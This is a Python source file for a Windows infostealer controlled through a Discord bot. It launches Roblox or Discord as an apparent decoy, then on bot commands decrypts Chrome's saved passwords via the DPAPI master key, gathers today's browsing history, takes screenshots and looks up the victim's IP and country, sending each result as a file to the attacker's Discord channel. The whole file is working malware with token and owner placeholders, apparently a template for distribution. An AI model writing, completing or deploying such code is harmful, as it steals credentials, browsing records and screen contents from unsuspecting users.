import os
import io
import sqlite3
import tempfile
import shutil
import json
import base64
import contextlib
import pyautogui
import subprocess
import requests
import socket


from datetime import datetime

import win32crypt
from Cryptodome.Cipher import AES

import discord
from discord.ext import commands


def launch_roblox():
    # Roblox launching logic
    local_app_data = os.getenv("LOCALAPPDATA")
    versions_path = os.path.join(local_app_data, "Roblox", "Versions")

    if not os.path.exists(versions_path):
        raise FileNotFoundError("Roblox Versions directory not found.")

    roblox_path = None
    for folder in os.listdir(versions_path):
        potential = os.path.join(versions_path, folder, "RobloxPlayerBeta.exe")
        if os.path.isfile(potential):
            roblox_path = potential
            break

    if not roblox_path:
        raise FileNotFoundError("RobloxPlayerLauncher.exe not found.")

    subprocess.run(['cmd', '/c', 'start', '', roblox_path], shell=True)

def launch_discord():
    possible_paths = [
        os.path.join(os.getenv("LOCALAPPDATA", ""), "Discord", "Discord.exe"),
        os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Discord Inc", "Discord.lnk")
    ]

    for path in possible_paths:
        if os.path.exists(path):
            subprocess.Popen(f'"{path}"', shell=True)
            print("✅ Discord launched.")
            return

    print("❌ Discord not found in expected locations.")



# ─────────────────────────────────────────────────────────────
# Chrome Password Extraction (Windows only)
# ─────────────────────────────────────────────────────────────
def get_master_key():
    local_state_path = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'
    )
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        return "Decryption failed"

def get_chrome_passwords():
    master_key = get_master_key()
    login_db = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'default', 'Login Data'
    )
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    buf = io.StringIO()
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        if username or encrypted_password:
            decrypted_password = decrypt_password(encrypted_password, master_key)
            buf.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")

    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
    return buf.getvalue().encode()

# ─────────────────────────────────────────────────────────────
# Chrome History (today only)
# ─────────────────────────────────────────────────────────────
def get_chrome_history_today(profile: str = "Default"):
    user = os.getenv("USERPROFILE")
    if not user:
        raise EnvironmentError("Not running on Windows")

    src_db = os.path.join(
        user, "AppData", "Local", "Google", "Chrome", "User Data", profile, "History"
    )
    if not os.path.exists(src_db):
        raise FileNotFoundError("Chrome history DB not found")

    with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as tmp:
        tmp_path = tmp.name
    with open(src_db, "rb") as s, open(tmp_path, "wb") as d:
        d.write(s.read())

    today_0 = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    epoch_1601 = datetime(1601, 1, 1)
    since_us = int((today_0 - epoch_1601).total_seconds() * 1_000_000)

    rows = []
    with contextlib.closing(sqlite3.connect(tmp_path)) as con:
        for url, title in con.execute(
            "SELECT url, title FROM urls WHERE last_visit_time>=? "
            "ORDER BY last_visit_time DESC",
            (since_us,),
        ):
            rows.append((url, title or ""))

    os.unlink(tmp_path)

    buf = io.StringIO()
    for url, title in rows:
        buf.write(f"{title} – {url}\n")
    data = buf.getvalue().encode()
    name = f"chrome_history_{today_0:%Y-%m-%d}.txt"
    return len(rows), data, name


#─────────────────────────────────────────────────────────────
#Ip address
#─────────────────────────────────────────────────────────────
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        return s.getsockname()[0]
    except Exception:
        return '127.0.0.1'
    finally:
        s.close()

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text.strip()
    except requests.RequestException:
        return 'Unable to fetch'

def get_country_and_flag(ip):
    try:
        res = requests.get(f'https://ipinfo.io/{ip}/json').json()
        country_code = res.get('country', 'Unknown')
        country_name = res.get('country', 'Unknown')
        flag = get_flag_emoji(country_code)
        return country_code, flag
    except Exception:
        return 'Unknown', '🏳️'

def get_flag_emoji(country_code):
    if len(country_code) != 2:
        return '🏳️'
    return chr(ord(country_code[0].upper()) + 127397) + chr(ord(country_code[1].upper()) + 127397)
#─────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────
# Discord Bot
# ─────────────────────────────────────────────────────────────

# 🔐 NOTE: This is your hardcoded token and owner ID.
# Make sure you regenerate them before using this in production.

TOKEN = "REPLACE_WITH_TOKEN"
OWNER_ID = "REPLACE_WITH_OWNER_ID"
LAUNCH_MODE = "REPLACE_WITH_LAUNCH_MODE"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} ({bot.user.id})")

@bot.command(name="ip")
async def ip(ctx: commands.Context):
    async with ctx.typing():
        try:
            local_ip = get_local_ip()
            public_ip = get_public_ip()
            country_code, flag = get_country_and_flag(public_ip)

            message = (
                f"📡 **IP Address Info:**\n"
                f"🖥️ Local IP: `{local_ip}`\n"
                f"🌐 Public IP: `{public_ip}`\n"
                f"🏳️ Country: {flag} `{country_code}`"
            )

            await ctx.send(message)

        except Exception as err:
            await ctx.send(f"⚠️ Error: `{err}`")
    
@bot.command(name="history")
async def history(ctx: commands.Context):
    async with ctx.typing():
        try:
            count, data, fname = get_chrome_history_today()
            if count == 0:
                await ctx.send("📭 No browsing history for today.")
                return

            await ctx.send(
                content=f"📄 Chrome history today ({count} items)",
                file=discord.File(io.BytesIO(data), filename=fname),
            )
        except Exception as err:
            await ctx.send(f"⚠️ Error: `{err}`")

@bot.command(name="passwords")
async def passwords(ctx: commands.Context):
    if str(ctx.author.id) != OWNER_ID:
        await ctx.send("❌ You are not authorized to use this command.")
        return

    async with ctx.typing():
        try:
            data = get_chrome_passwords()
            await ctx.send(
                content="🔐 Chrome saved passwords (use responsibly)",
                file=discord.File(io.BytesIO(data), filename="chrome_passwords.txt"),
            )
        except Exception as err:
            await ctx.send(f"⚠️ Error: `{err}`")

@bot.command(name="ss")
async def screenshot(ctx: commands.Context):
    if str(ctx.author.id) != OWNER_ID:
        await ctx.send("❌ You are not authorized to use this command.")
        return

    async with ctx.typing():
        try:
            screenshot_path = "screenshot.png"
            pyautogui.screenshot(screenshot_path)
            print("📸 Screenshot taken and saved to screenshot.png")
            await ctx.send(
                content="🖼️ Screenshot of current screen",
                file=discord.File(screenshot_path)
            )
            os.remove(screenshot_path)
        except Exception as err:
            await ctx.send(f"⚠️ Screenshot failed: `{err}`")
            

if __name__ == "__main__":
    if not TOKEN or not OWNER_ID:
        print("❌ DISCORD_TOKEN or BOT_OWNER_ID is not set.")
    else:
        print(f"[DEBUG] TOKEN: {repr(TOKEN)}")
        
        if LAUNCH_MODE == "discord":
            launch_discord()
        elif LAUNCH_MODE == "roblox":
            launch_roblox()

        bot.run(TOKEN)
